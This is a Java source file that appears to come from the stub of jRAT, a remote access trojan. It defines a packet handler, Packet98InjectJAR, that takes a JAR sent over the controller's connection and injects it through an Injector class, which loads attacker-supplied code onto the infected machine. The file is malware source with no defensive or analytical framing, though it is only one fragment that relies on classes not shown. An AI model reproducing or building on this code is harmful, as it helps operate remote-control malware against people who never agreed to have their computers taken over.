package su.jrat.stub.packets.incoming;

import su.jrat.stub.Connection;
import su.jrat.stub.Injector;

public class Packet98InjectJAR extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Injector i = new Injector();
		i.inject(Connection.dis);
	}

}
